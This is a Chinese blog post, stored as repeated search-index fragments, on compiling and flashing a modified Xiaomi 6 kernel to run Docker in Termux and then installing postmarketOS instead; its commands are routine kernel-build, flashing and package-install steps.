另外注意，如果是小米手机，最好不要用小米官方github上的内核。本人亲身体会，编译过程不仅一堆BUG，刷入系统后还开不了机。后来看到看雪的帖子，很多人也遇到了同样的情况：https://bbs.pediy.com/thread-262263.htm 经过一番查找对比，最后选择以lineageOS维护的小米6(sagit)的内核源码作为基础：https://github.com/LineageOS/android_kernel_xiaomi_msm8998 git clone https://github.com/LineageOS/android_kernel_xiaomi_msm8998 --depth=1 sagit是小米6的手机代号，这个代号独一无二，可以百度搜一下自己手机的对应代号。 ","date":"2022-12-10","objectID":"/posts/android-run-docker/:2:1","series":null,"tags":[],"title":"手机运行Docker: 从修改内核到刷入原生Linux","uri":"/posts/android-run-docker/#准备工作"},{"categories":null,"content":"\r2.2 修改内核我们首先不做修改，编译一次看报不报错。 cd ./android_kernel_xiaomi_msm8998 sudo apt install build-essential openssl pkg-config libssl-dev libncurses5-dev pkg-config minizip libelf-dev flex bison libc6-dev libidn11-dev rsync bc liblz4-tool sudo apt install gcc-aarch64-linux-gnu dpkg-dev dpkg git export ARCH=arm64 export SUBARCH=arm64 export CROSS_COMPILE=aarch64-linux-gnu- make O=out sagit_defconfig make O=out -j$(nproc) 2.2.1 error：CROSS_COMPILE_ARM32 not defined or empty\rkernel config 里面删掉 CONFIG_COMPAT_VDSO 2.2.2 error: statement with no effect [-Werror=unused-value] ../drivers/staging/qcacld-3.0/core/hdd/src/wlan_hdd_cfg.c: In function ‘hdd_cfg_print’: ../drivers/staging/qcacld-3.0/core/hdd/src/wlan_hdd_cfg.c:6896:43: error: statement with no effect [-Werror=unused-value] error: ‘staid’ may be used uninitialized in this function [-Werror=maybe-uninitialized] 911 | hdd_dhcp_indication(pAdapter, staid, skb, QDF_RX); | ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ CC drivers/soc/qcom/early_random.o CC drivers/video/fbdev/msm/mdss_mdp_ctl.o CC drivers/video/fbdev/msm/mdss_mdp_pipe.o 临时解决办法： 增加 -Wno-error=unused-value -Wno-error=maybe-uninitialized，见一种加一种。最后觉得太麻烦了，直接Makefile里增加-w选项，屏蔽所有警告。 2.2.3 开启内核支持安装termux。这里为了控制方便我开启了ssh，用电脑连接上去操作。然后下载check脚本看缺少哪些内核选项。 pkg install tsu pkg install wget wget https://raw.githubusercontent.com/moby/moby/master/contrib/check-config.sh chmod +x check-config.sh sed -i '1s_.*_#!/data/data/com.termux/files/usr/bin/bash_' check-config.sh sudo ./check-config.sh Generally Necessary下面必须要全部是绿色才有可能安装Docker，这里看到还是有很多内核选项是缺失的。 常规的修改内核选项是需要通过menuconfig，但是缺的太多了，一个个手动开启很麻烦。我们可以用一个偷懒的方法：直接编辑defconfig文件，手动添加进去。可以按照酷安上的一个帖子来操作： https://www.coolapk.com/feed/38099071?shareKey=YTdhYmE1NWRkZjE3NjM3MzgwZjQ~\u0026shareUid=23564717\u0026shareFrom=com.coolapk.market_12.5.2 vim arch/arm64/configs/sagit_defcofig 加入以下内容，并保存。 CONFIG_NAMESPACES=y CONFIG_NET_NS=y CONFIG_PID_NS=y CONFIG_IPC_NS=y CONFIG_UTS_NS=y CONFIG_CGROUPS=y CONFIG_CGROUP_CPUACCT=y CONFIG_CGROUP_DEVICE=y CONFIG_CGROUP_FREEZER=y CONFIG_CGROUP_SCHED=y CONFIG_CPUSETS=y CONFIG_MEMCG=y CONFIG_KEYS=y CONFIG_VETH=y CONFIG_BRIDGE=y CONFIG_BRIDGE_NETFILTER=y CONFIG_IP_NF_FILTER=y CONFIG_IP_NF_TARGET_MASQUERADE=y CONFIG_NETFILTER_XT_MATCH_ADDRTYPE=y CONFIG_NETFILTER_XT_MATCH_CONNTRACK=y CONFIG_NETFILTER_XT_MATCH_IPVS=y CONFIG_NETFILTER_XT_MARK=y CONFIG_IP_NF_NAT=y CONFIG_NF_NAT=y CONFIG_POSIX_MQUEUE=y CONFIG_NF_NAT_IPV4=y CONFIG_NF_NAT_NEEDED=y CONFIG_CGROUP_BPF=y CONFIG_USER_NS=y CONFIG_SECCOMP=y CONFIG_SECCOMP_FILTER=y CONFIG_CGROUP_PIDS=y CONFIG_MEMCG_SWAP=y CONFIG_MEMCG_SWAP_ENABLED=y CONFIG_IOSCHED_CFQ=y CONFIG_CFQ_GROUP_IOSCHED=y CONFIG_BLK_CGROUP=y CONFIG_BLK_DEV_THROTTLING=y CONFIG_CGROUP_PERF=y CONFIG_CGROUP_HUGETLB=y CONFIG_NET_CLS_CGROUP=y CONFIG_CGROUP_NET_PRIO=y CONFIG_CFS_BANDWIDTH=y CONFIG_FAIR_GROUP_SCHED=y CONFIG_RT_GROUP_SCHED=y CONFIG_IP_NF_TARGET_REDIRECT=y CONFIG_IP_VS=y CONFIG_IP_VS_NFCT=y CONFIG_IP_VS_PROTO_TCP=y CONFIG_IP_VS_PROTO_UDP=y CONFIG_IP_VS_RR=y CONFIG_SECURITY_SELINUX=y CONFIG_SECURITY_APPARMOR=y CONFIG_EXT4_FS=y CONFIG_EXT4_FS_POSIX_ACL=y CONFIG_EXT4_FS_SECURITY=y CONFIG_VXLAN=y CONFIG_BRIDGE_VLAN_FILTERING=y CONFIG_CRYPTO=y CONFIG_CRYPTO_AEAD=y CONFIG_CRYPTO_GCM=y CONFIG_CRYPTO_SEQIV=y CONFIG_CRYPTO_GHASH=y CONFIG_XFRM=y CONFIG_XFRM_USER=y CONFIG_XFRM_ALGO=y CONFIG_INET_ESP=y CONFIG_INET_XFRM_MODE_TRANSPORT=y CONFIG_IPVLAN=y CONFIG_MACVLAN=y CONFIG_DUMMY=y CONFIG_NF_NAT_FTP=y CONFIG_NF_CONNTRACK_FTP=y CONFIG_NF_NAT_TFTP=y CONFIG_NF_CONNTRACK_TFTP=y CONFIG_AUFS_FS=y CONFIG_BTRFS_FS=y CONFIG_BTRFS_FS_POSIX_ACL=y CONFIG_BLK_DEV_DM=y CONFIG_DM_THIN_PROVISIONING=y CONFIG_OVERLAY_FS=y 但是注意，这里是有坑的：按照这个帖子中的操作后刷入内核，再跑一遍check脚本会发现还是会有missing，原因是部分内核选项需要依赖另外的选项，而这些另外的依赖没有开启，所以还是missing的状态。 所以最完整的做法，是加入之后再手动make menuconfig，看哪些缺失开哪些。 rm -rf out make O=out sagit_defconfig make O=out menuconfig make O=out savedefconfig make O=out -j$(nproc) 经过等待之后，如果出现如下提示，就说明我们的内核已经编译好了。 ","date":"2022-12-10","objectID":"/posts/android-run-docker/:2:2","series":null,"tags":[],"title":"手机运行Docker: 从修改内核到刷入原生Linux","uri":"/posts/android-run-docker/#修改内核"},{"categories":null,"content":"\r2.2 修改内核我们首先不做修改，编译一次看报不报错。 cd ./android_kernel_xiaomi_msm8998 sudo apt install build-essential openssl pkg-config libssl-dev libncurses5-dev pkg-config minizip libelf-dev flex bison libc6-dev libidn11-dev rsync bc liblz4-tool sudo apt install gcc-aarch64-linux-gnu dpkg-dev dpkg git export ARCH=arm64 export SUBARCH=arm64 export CROSS_COMPILE=aarch64-linux-gnu- make O=out sagit_defconfig make O=out -j$(nproc) 2.2.1 error：CROSS_COMPILE_ARM32 not defined or empty\rkernel config 里面删掉 CONFIG_COMPAT_VDSO 2.2.2 error: statement with no effect [-Werror=unused-value] ../drivers/staging/qcacld-3.0/core/hdd/src/wlan_hdd_cfg.c: In function ‘hdd_cfg_print’: ../drivers/staging/qcacld-3.0/core/hdd/src/wlan_hdd_cfg.c:6896:43: error: statement with no effect [-Werror=unused-value] error: ‘staid’ may be used uninitialized in this function [-Werror=maybe-uninitialized] 911 | hdd_dhcp_indication(pAdapter, staid, skb, QDF_RX); | ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ CC drivers/soc/qcom/early_random.o CC drivers/video/fbdev/msm/mdss_mdp_ctl.o CC drivers/video/fbdev/msm/mdss_mdp_pipe.o 临时解决办法： 增加 -Wno-error=unused-value -Wno-error=maybe-uninitialized，见一种加一种。最后觉得太麻烦了，直接Makefile里增加-w选项，屏蔽所有警告。 2.2.3 开启内核支持安装termux。这里为了控制方便我开启了ssh，用电脑连接上去操作。然后下载check脚本看缺少哪些内核选项。 pkg install tsu pkg install wget wget https://raw.githubusercontent.com/moby/moby/master/contrib/check-config.sh chmod +x check-config.sh sed -i '1s_.*_#!/data/data/com.termux/files/usr/bin/bash_' check-config.sh sudo ./check-config.sh Generally Necessary下面必须要全部是绿色才有可能安装Docker，这里看到还是有很多内核选项是缺失的。 常规的修改内核选项是需要通过menuconfig，但是缺的太多了，一个个手动开启很麻烦。我们可以用一个偷懒的方法：直接编辑defconfig文件，手动添加进去。可以按照酷安上的一个帖子来操作： https://www.coolapk.com/feed/38099071?shareKey=YTdhYmE1NWRkZjE3NjM3MzgwZjQ~\u0026shareUid=23564717\u0026shareFrom=com.coolapk.market_12.5.2 vim arch/arm64/configs/sagit_defcofig 加入以下内容，并保存。 CONFIG_NAMESPACES=y CONFIG_NET_NS=y CONFIG_PID_NS=y CONFIG_IPC_NS=y CONFIG_UTS_NS=y CONFIG_CGROUPS=y CONFIG_CGROUP_CPUACCT=y CONFIG_CGROUP_DEVICE=y CONFIG_CGROUP_FREEZER=y CONFIG_CGROUP_SCHED=y CONFIG_CPUSETS=y CONFIG_MEMCG=y CONFIG_KEYS=y CONFIG_VETH=y CONFIG_BRIDGE=y CONFIG_BRIDGE_NETFILTER=y CONFIG_IP_NF_FILTER=y CONFIG_IP_NF_TARGET_MASQUERADE=y CONFIG_NETFILTER_XT_MATCH_ADDRTYPE=y CONFIG_NETFILTER_XT_MATCH_CONNTRACK=y CONFIG_NETFILTER_XT_MATCH_IPVS=y CONFIG_NETFILTER_XT_MARK=y CONFIG_IP_NF_NAT=y CONFIG_NF_NAT=y CONFIG_POSIX_MQUEUE=y CONFIG_NF_NAT_IPV4=y CONFIG_NF_NAT_NEEDED=y CONFIG_CGROUP_BPF=y CONFIG_USER_NS=y CONFIG_SECCOMP=y CONFIG_SECCOMP_FILTER=y CONFIG_CGROUP_PIDS=y CONFIG_MEMCG_SWAP=y CONFIG_MEMCG_SWAP_ENABLED=y CONFIG_IOSCHED_CFQ=y CONFIG_CFQ_GROUP_IOSCHED=y CONFIG_BLK_CGROUP=y CONFIG_BLK_DEV_THROTTLING=y CONFIG_CGROUP_PERF=y CONFIG_CGROUP_HUGETLB=y CONFIG_NET_CLS_CGROUP=y CONFIG_CGROUP_NET_PRIO=y CONFIG_CFS_BANDWIDTH=y CONFIG_FAIR_GROUP_SCHED=y CONFIG_RT_GROUP_SCHED=y CONFIG_IP_NF_TARGET_REDIRECT=y CONFIG_IP_VS=y CONFIG_IP_VS_NFCT=y CONFIG_IP_VS_PROTO_TCP=y CONFIG_IP_VS_PROTO_UDP=y CONFIG_IP_VS_RR=y CONFIG_SECURITY_SELINUX=y CONFIG_SECURITY_APPARMOR=y CONFIG_EXT4_FS=y CONFIG_EXT4_FS_POSIX_ACL=y CONFIG_EXT4_FS_SECURITY=y CONFIG_VXLAN=y CONFIG_BRIDGE_VLAN_FILTERING=y CONFIG_CRYPTO=y CONFIG_CRYPTO_AEAD=y CONFIG_CRYPTO_GCM=y CONFIG_CRYPTO_SEQIV=y CONFIG_CRYPTO_GHASH=y CONFIG_XFRM=y CONFIG_XFRM_USER=y CONFIG_XFRM_ALGO=y CONFIG_INET_ESP=y CONFIG_INET_XFRM_MODE_TRANSPORT=y CONFIG_IPVLAN=y CONFIG_MACVLAN=y CONFIG_DUMMY=y CONFIG_NF_NAT_FTP=y CONFIG_NF_CONNTRACK_FTP=y CONFIG_NF_NAT_TFTP=y CONFIG_NF_CONNTRACK_TFTP=y CONFIG_AUFS_FS=y CONFIG_BTRFS_FS=y CONFIG_BTRFS_FS_POSIX_ACL=y CONFIG_BLK_DEV_DM=y CONFIG_DM_THIN_PROVISIONING=y CONFIG_OVERLAY_FS=y 但是注意，这里是有坑的：按照这个帖子中的操作后刷入内核，再跑一遍check脚本会发现还是会有missing，原因是部分内核选项需要依赖另外的选项，而这些另外的依赖没有开启，所以还是missing的状态。 所以最完整的做法，是加入之后再手动make menuconfig，看哪些缺失开哪些。 rm -rf out make O=out sagit_defconfig make O=out menuconfig make O=out savedefconfig make O=out -j$(nproc) 经过等待之后，如果出现如下提示，就说明我们的内核已经编译好了。 ","date":"2022-12-10","objectID":"/posts/android-run-docker/:2:2","series":null,"tags":[],"title":"手机运行Docker: 从修改内核到刷入原生Linux","uri":"/posts/android-run-docker/#errorcross_compile_arm32-not-defined-or-empty"},{"categories":null,"content":"\r2.2 修改内核我们首先不做修改，编译一次看报不报错。 cd ./android_kernel_xiaomi_msm8998 sudo apt install build-essential openssl pkg-config libssl-dev libncurses5-dev pkg-config minizip libelf-dev flex bison libc6-dev libidn11-dev rsync bc liblz4-tool sudo apt install gcc-aarch64-linux-gnu dpkg-dev dpkg git export ARCH=arm64 export SUBARCH=arm64 export CROSS_COMPILE=aarch64-linux-gnu- make O=out sagit_defconfig make O=out -j$(nproc) 2.2.1 error：CROSS_COMPILE_ARM32 not defined or empty\rkernel config 里面删掉 CONFIG_COMPAT_VDSO 2.2.2 error: statement with no effect [-Werror=unused-value] ../drivers/staging/qcacld-3.0/core/hdd/src/wlan_hdd_cfg.c: In function ‘hdd_cfg_print’: ../drivers/staging/qcacld-3.0/core/hdd/src/wlan_hdd_cfg.c:6896:43: error: statement with no effect [-Werror=unused-value] error: ‘staid’ may be used uninitialized in this function [-Werror=maybe-uninitialized] 911 | hdd_dhcp_indication(pAdapter, staid, skb, QDF_RX); | ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ CC drivers/soc/qcom/early_random.o CC drivers/video/fbdev/msm/mdss_mdp_ctl.o CC drivers/video/fbdev/msm/mdss_mdp_pipe.o 临时解决办法： 增加 -Wno-error=unused-value -Wno-error=maybe-uninitialized，见一种加一种。最后觉得太麻烦了，直接Makefile里增加-w选项，屏蔽所有警告。 2.2.3 开启内核支持安装termux。这里为了控制方便我开启了ssh，用电脑连接上去操作。然后下载check脚本看缺少哪些内核选项。 pkg install tsu pkg install wget wget https://raw.githubusercontent.com/moby/moby/master/contrib/check-config.sh chmod +x check-config.sh sed -i '1s_.*_#!/data/data/com.termux/files/usr/bin/bash_' check-config.sh sudo ./check-config.sh Generally Necessary下面必须要全部是绿色才有可能安装Docker，这里看到还是有很多内核选项是缺失的。 常规的修改内核选项是需要通过menuconfig，但是缺的太多了，一个个手动开启很麻烦。我们可以用一个偷懒的方法：直接编辑defconfig文件，手动添加进去。可以按照酷安上的一个帖子来操作： https://www.coolapk.com/feed/38099071?shareKey=YTdhYmE1NWRkZjE3NjM3MzgwZjQ~\u0026shareUid=23564717\u0026shareFrom=com.coolapk.market_12.5.2 vim arch/arm64/configs/sagit_defcofig 加入以下内容，并保存。 CONFIG_NAMESPACES=y CONFIG_NET_NS=y CONFIG_PID_NS=y CONFIG_IPC_NS=y CONFIG_UTS_NS=y CONFIG_CGROUPS=y CONFIG_CGROUP_CPUACCT=y CONFIG_CGROUP_DEVICE=y CONFIG_CGROUP_FREEZER=y CONFIG_CGROUP_SCHED=y CONFIG_CPUSETS=y CONFIG_MEMCG=y CONFIG_KEYS=y CONFIG_VETH=y CONFIG_BRIDGE=y CONFIG_BRIDGE_NETFILTER=y CONFIG_IP_NF_FILTER=y CONFIG_IP_NF_TARGET_MASQUERADE=y CONFIG_NETFILTER_XT_MATCH_ADDRTYPE=y CONFIG_NETFILTER_XT_MATCH_CONNTRACK=y CONFIG_NETFILTER_XT_MATCH_IPVS=y CONFIG_NETFILTER_XT_MARK=y CONFIG_IP_NF_NAT=y CONFIG_NF_NAT=y CONFIG_POSIX_MQUEUE=y CONFIG_NF_NAT_IPV4=y CONFIG_NF_NAT_NEEDED=y CONFIG_CGROUP_BPF=y CONFIG_USER_NS=y CONFIG_SECCOMP=y CONFIG_SECCOMP_FILTER=y CONFIG_CGROUP_PIDS=y CONFIG_MEMCG_SWAP=y CONFIG_MEMCG_SWAP_ENABLED=y CONFIG_IOSCHED_CFQ=y CONFIG_CFQ_GROUP_IOSCHED=y CONFIG_BLK_CGROUP=y CONFIG_BLK_DEV_THROTTLING=y CONFIG_CGROUP_PERF=y CONFIG_CGROUP_HUGETLB=y CONFIG_NET_CLS_CGROUP=y CONFIG_CGROUP_NET_PRIO=y CONFIG_CFS_BANDWIDTH=y CONFIG_FAIR_GROUP_SCHED=y CONFIG_RT_GROUP_SCHED=y CONFIG_IP_NF_TARGET_REDIRECT=y CONFIG_IP_VS=y CONFIG_IP_VS_NFCT=y CONFIG_IP_VS_PROTO_TCP=y CONFIG_IP_VS_PROTO_UDP=y CONFIG_IP_VS_RR=y CONFIG_SECURITY_SELINUX=y CONFIG_SECURITY_APPARMOR=y CONFIG_EXT4_FS=y CONFIG_EXT4_FS_POSIX_ACL=y CONFIG_EXT4_FS_SECURITY=y CONFIG_VXLAN=y CONFIG_BRIDGE_VLAN_FILTERING=y CONFIG_CRYPTO=y CONFIG_CRYPTO_AEAD=y CONFIG_CRYPTO_GCM=y CONFIG_CRYPTO_SEQIV=y CONFIG_CRYPTO_GHASH=y CONFIG_XFRM=y CONFIG_XFRM_USER=y CONFIG_XFRM_ALGO=y CONFIG_INET_ESP=y CONFIG_INET_XFRM_MODE_TRANSPORT=y CONFIG_IPVLAN=y CONFIG_MACVLAN=y CONFIG_DUMMY=y CONFIG_NF_NAT_FTP=y CONFIG_NF_CONNTRACK_FTP=y CONFIG_NF_NAT_TFTP=y CONFIG_NF_CONNTRACK_TFTP=y CONFIG_AUFS_FS=y CONFIG_BTRFS_FS=y CONFIG_BTRFS_FS_POSIX_ACL=y CONFIG_BLK_DEV_DM=y CONFIG_DM_THIN_PROVISIONING=y CONFIG_OVERLAY_FS=y 但是注意，这里是有坑的：按照这个帖子中的操作后刷入内核，再跑一遍check脚本会发现还是会有missing，原因是部分内核选项需要依赖另外的选项，而这些另外的依赖没有开启，所以还是missing的状态。 所以最完整的做法，是加入之后再手动make menuconfig，看哪些缺失开哪些。 rm -rf out make O=out sagit_defconfig make O=out menuconfig make O=out savedefconfig make O=out -j$(nproc) 经过等待之后，如果出现如下提示，就说明我们的内核已经编译好了。 ","date":"2022-12-10","objectID":"/posts/android-run-docker/:2:2","series":null,"tags":[],"title":"手机运行Docker: 从修改内核到刷入原生Linux","uri":"/posts/android-run-docker/#error-statement-with-no-effect--werrorunused-value"},{"categories":null,"content":"\r2.2 修改内核我们首先不做修改，编译一次看报不报错。 cd ./android_kernel_xiaomi_msm8998 sudo apt install build-essential openssl pkg-config libssl-dev libncurses5-dev pkg-config minizip libelf-dev flex bison libc6-dev libidn11-dev rsync bc liblz4-tool sudo apt install gcc-aarch64-linux-gnu dpkg-dev dpkg git export ARCH=arm64 export SUBARCH=arm64 export CROSS_COMPILE=aarch64-linux-gnu- make O=out sagit_defconfig make O=out -j$(nproc) 2.2.1 error：CROSS_COMPILE_ARM32 not defined or empty\rkernel config 里面删掉 CONFIG_COMPAT_VDSO 2.2.2 error: statement with no effect [-Werror=unused-value] ../drivers/staging/qcacld-3.0/core/hdd/src/wlan_hdd_cfg.c: In function ‘hdd_cfg_print’: ../drivers/staging/qcacld-3.0/core/hdd/src/wlan_hdd_cfg.c:6896:43: error: statement with no effect [-Werror=unused-value] error: ‘staid’ may be used uninitialized in this function [-Werror=maybe-uninitialized] 911 | hdd_dhcp_indication(pAdapter, staid, skb, QDF_RX); | ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ CC drivers/soc/qcom/early_random.o CC drivers/video/fbdev/msm/mdss_mdp_ctl.o CC drivers/video/fbdev/msm/mdss_mdp_pipe.o 临时解决办法： 增加 -Wno-error=unused-value -Wno-error=maybe-uninitialized，见一种加一种。最后觉得太麻烦了，直接Makefile里增加-w选项，屏蔽所有警告。 2.2.3 开启内核支持安装termux。这里为了控制方便我开启了ssh，用电脑连接上去操作。然后下载check脚本看缺少哪些内核选项。 pkg install tsu pkg install wget wget https://raw.githubusercontent.com/moby/moby/master/contrib/check-config.sh chmod +x check-config.sh sed -i '1s_.*_#!/data/data/com.termux/files/usr/bin/bash_' check-config.sh sudo ./check-config.sh Generally Necessary下面必须要全部是绿色才有可能安装Docker，这里看到还是有很多内核选项是缺失的。 常规的修改内核选项是需要通过menuconfig，但是缺的太多了，一个个手动开启很麻烦。我们可以用一个偷懒的方法：直接编辑defconfig文件，手动添加进去。可以按照酷安上的一个帖子来操作： https://www.coolapk.com/feed/38099071?shareKey=YTdhYmE1NWRkZjE3NjM3MzgwZjQ~\u0026shareUid=23564717\u0026shareFrom=com.coolapk.market_12.5.2 vim arch/arm64/configs/sagit_defcofig 加入以下内容，并保存。 CONFIG_NAMESPACES=y CONFIG_NET_NS=y CONFIG_PID_NS=y CONFIG_IPC_NS=y CONFIG_UTS_NS=y CONFIG_CGROUPS=y CONFIG_CGROUP_CPUACCT=y CONFIG_CGROUP_DEVICE=y CONFIG_CGROUP_FREEZER=y CONFIG_CGROUP_SCHED=y CONFIG_CPUSETS=y CONFIG_MEMCG=y CONFIG_KEYS=y CONFIG_VETH=y CONFIG_BRIDGE=y CONFIG_BRIDGE_NETFILTER=y CONFIG_IP_NF_FILTER=y CONFIG_IP_NF_TARGET_MASQUERADE=y CONFIG_NETFILTER_XT_MATCH_ADDRTYPE=y CONFIG_NETFILTER_XT_MATCH_CONNTRACK=y CONFIG_NETFILTER_XT_MATCH_IPVS=y CONFIG_NETFILTER_XT_MARK=y CONFIG_IP_NF_NAT=y CONFIG_NF_NAT=y CONFIG_POSIX_MQUEUE=y CONFIG_NF_NAT_IPV4=y CONFIG_NF_NAT_NEEDED=y CONFIG_CGROUP_BPF=y CONFIG_USER_NS=y CONFIG_SECCOMP=y CONFIG_SECCOMP_FILTER=y CONFIG_CGROUP_PIDS=y CONFIG_MEMCG_SWAP=y CONFIG_MEMCG_SWAP_ENABLED=y CONFIG_IOSCHED_CFQ=y CONFIG_CFQ_GROUP_IOSCHED=y CONFIG_BLK_CGROUP=y CONFIG_BLK_DEV_THROTTLING=y CONFIG_CGROUP_PERF=y CONFIG_CGROUP_HUGETLB=y CONFIG_NET_CLS_CGROUP=y CONFIG_CGROUP_NET_PRIO=y CONFIG_CFS_BANDWIDTH=y CONFIG_FAIR_GROUP_SCHED=y CONFIG_RT_GROUP_SCHED=y CONFIG_IP_NF_TARGET_REDIRECT=y CONFIG_IP_VS=y CONFIG_IP_VS_NFCT=y CONFIG_IP_VS_PROTO_TCP=y CONFIG_IP_VS_PROTO_UDP=y CONFIG_IP_VS_RR=y CONFIG_SECURITY_SELINUX=y CONFIG_SECURITY_APPARMOR=y CONFIG_EXT4_FS=y CONFIG_EXT4_FS_POSIX_ACL=y CONFIG_EXT4_FS_SECURITY=y CONFIG_VXLAN=y CONFIG_BRIDGE_VLAN_FILTERING=y CONFIG_CRYPTO=y CONFIG_CRYPTO_AEAD=y CONFIG_CRYPTO_GCM=y CONFIG_CRYPTO_SEQIV=y CONFIG_CRYPTO_GHASH=y CONFIG_XFRM=y CONFIG_XFRM_USER=y CONFIG_XFRM_ALGO=y CONFIG_INET_ESP=y CONFIG_INET_XFRM_MODE_TRANSPORT=y CONFIG_IPVLAN=y CONFIG_MACVLAN=y CONFIG_DUMMY=y CONFIG_NF_NAT_FTP=y CONFIG_NF_CONNTRACK_FTP=y CONFIG_NF_NAT_TFTP=y CONFIG_NF_CONNTRACK_TFTP=y CONFIG_AUFS_FS=y CONFIG_BTRFS_FS=y CONFIG_BTRFS_FS_POSIX_ACL=y CONFIG_BLK_DEV_DM=y CONFIG_DM_THIN_PROVISIONING=y CONFIG_OVERLAY_FS=y 但是注意，这里是有坑的：按照这个帖子中的操作后刷入内核，再跑一遍check脚本会发现还是会有missing，原因是部分内核选项需要依赖另外的选项，而这些另外的依赖没有开启，所以还是missing的状态。 所以最完整的做法，是加入之后再手动make menuconfig，看哪些缺失开哪些。 rm -rf out make O=out sagit_defconfig make O=out menuconfig make O=out savedefconfig make O=out -j$(nproc) 经过等待之后，如果出现如下提示，就说明我们的内核已经编译好了。 ","date":"2022-12-10","objectID":"/posts/android-run-docker/:2:2","series":null,"tags":[],"title":"手机运行Docker: 从修改内核到刷入原生Linux","uri":"/posts/android-run-docker/#开启内核支持"},{"categories":null,"content":"\r2.3 刷入内核刷入内核使用的是Anykernel3，详细可以看这篇教程：https://www.akr-developers.com/d/125 修改完配置文件后，把上一步arch/arm64/boot/Image.gz-dtb放到Anykernel3的根目录下，然后在根目录中执行zip -r \u003c压缩包名.zip\u003e *即可 最后通过twrp：adb sideload xxx.zip刷入内核。 ","date":"2022-12-10","objectID":"/posts/android-run-docker/:2:3","series":null,"tags":[],"title":"手机运行Docker: 从修改内核到刷入原生Linux","uri":"/posts/android-run-docker/#刷入内核"},{"categories":null,"content":"\r2.4 Termux安装dockerTermux里面再跑一边check脚本，保证Generally Necessary是绿的。然后进入下一步：安装Docker。 通过Termux执行以下命令 apt update \u0026\u0026 apt upgrade -y pkg install root-repo pkg install golang make cmake ndk-multilib tsu tmux docker 然后编译tini mkdir $TMPDIR/docker-build $ cd $TMPDIR/docker-build $ wget https://github.com/krallin/tini/archive/v0.19.0.tar.gz $ tar xf v0.19.0.tar.gz $ cd tini-0.19.0 $ mkdir build $ cd build $ cmake -DCMAKE_BUILD_TYPE=Release -DCMAKE_INSTALL_PREFIX=$PREFIX .. $ make -j8 $ make install $ ln -s $PREFIX/bin/tini-static $PREFIX/bin/docker-init 编译的时候会有一个报错 /data/data/com.termux/files/usr/tmp/docker-build/tini-0.19.0/src/tini.c:434:19: error: a function declaration without a prototype is deprecated in all versions of C [-Werror,-Wstrict-prototypes] void reaper_check () { ^ void 手动修一下，在报错的地方加一个void，或者make的时候加入gcc参数忽略报错。 启动Docker sudo dockerd --iptables=false \u0026\u003e/dev/null \u0026 测试Docker是否正常运行 sudo docker run hello-world 这里我的设备报错了，搜了很久也没找到原因跟解决办法，在老外帖子下面的评论区也有人回复说遇到了一模一样的情况。无奈只好放弃。 报错日志 docker: Error response from daemon: failed to create shim task: OCI runtime create failed: runc create failed: unable to start container process: error during container init: error mounting \"mqueue\" to rootfs at \"/dev/mqueue\": mount mqueue:/dev/mqueue (via /proc/self/fd/6), flags: 0xe: device or resource busy: unknown. ","date":"2022-12-10","objectID":"/posts/android-run-docker/:2:4","series":null,"tags":[],"title":"手机运行Docker: 从修改内核到刷入原生Linux","uri":"/posts/android-run-docker/#termux安装docker"},{"categories":null,"content":"\r3 方案二：刷入postmarkOS安卓内核阉割的东西太多了，鬼知道改了什么东西。修改安卓内核的方式行不通，只能转换思路。那么能否在手机上去安装一个完整的Linux呢，当然是可以的，那就是postmarkOS。 postmarkOS是一个运行在手机上的Linux系统，基于Alpine Linux，比Ubuntu Touch更为接近原始的Linux，并且尽量使用Mainline kernel。官网：https://wiki.postmarketos.org/ ","date":"2022-12-10","objectID":"/posts/android-run-docker/:3:0","series":null,"tags":[],"title":"手机运行Docker: 从修改内核到刷入原生Linux","uri":"/posts/android-run-docker/#方案二刷入postmarkos"},{"categories":null,"content":"\r3.1 准备工作之前研究这个项目的时候，官方还没有合并小米6的分支：https://gitlab.com/postmarketOS/pmaports/-/merge_requests/3134， 只能手动本地编译一波。当时查看底层代码后发现postmarketOS官方的安装工具pmbootstrap对本地开发分支不太友好，例如构建rootfs下载驱动的时候，会硬编码从pmos的gitlab项目去拉取驱动，而我们使用的是本地修改的分支，当然是下载不到的。后来又魔改了一波pmbootstrap的代码，将硬编码的部分改为本地获取。不过网上对于pmOS移植这块的文档很少，也可能是我操作的姿势不对，最后勉强build好了一个zip，刷入系统但是开不了机。 不过好消息是两周前官方已经把小米6的分支合并进去了，也就意味着我们不用自己去手动移植了。更详细的教程可以参考这一篇：https://www.cnblogs.com/hongshao/p/14351045.html。 首先在Linux中执行以下命令： pip3 install --user pmbootstrap pip3 install --user --upgrade pmbootstrap pmbootstrap init ","date":"2022-12-10","objectID":"/posts/android-run-docker/:3:1","series":null,"tags":[],"title":"手机运行Docker: 从修改内核到刷入原生Linux","uri":"/posts/android-run-docker/#准备工作-1"},{"categories":null,"content":"\r3.2 刷入postmarkOS在官方的教程中 ，默认是通过pmbootstrap flasher 命令直接刷入，但是我选择了制作卡刷包来刷入系统，这样卡刷包可以后期反复使用：https://wiki.postmarketos.org/wiki/Installation_from_recovery_mode 注意一定要加 –recovery-install-partition=data参数，不然刷入后你的分区会非常的小。 pmbootstrap install --android-recovery-zip --recovery-install-partition=data pmbootstrap export cd $(dirname $(readlink /tmp/postmarketOS-export/pmos-*.zip)) 这里有一个坑，拿到zip文件后这个时候还不能直接adb sideload，会报错： 正确的做法是要先进入twrp，然后unmount所有的分区，再进行sideload刷入。 adb sideload pmos-xiaomi-sagit.zip 刷完后twrp会有一个提示：挂载data失败。别着急，因为data分区已经被我们修改了，其实系统已经刷入完成了。 重启就可以进入我们刷好的postmarketOS系统了。 ","date":"2022-12-10","objectID":"/posts/android-run-docker/:3:2","series":null,"tags":[],"title":"手机运行Docker: 从修改内核到刷入原生Linux","uri":"/posts/android-run-docker/#刷入postmarkos"},{"categories":null,"content":"\r3.3 安装RNDIS驱动首先按照官方的教程，开启手机的SSH：https://wiki.postmarketos.org/wiki/SSH。 这里出现了一个问题，开启SSH服务后连接电脑，提示无法识别设备，原因是电脑上没有对应的驱动，需要按照我下面的步骤来安装。 安装完毕后就可以正常识别手机设备了，成功连接上了SSH。 ","date":"2022-12-10","objectID":"/posts/android-run-docker/:3:3","series":null,"tags":[],"title":"手机运行Docker: 从修改内核到刷入原生Linux","uri":"/posts/android-run-docker/#安装rndis驱动"},{"categories":null,"content":"\r3.4 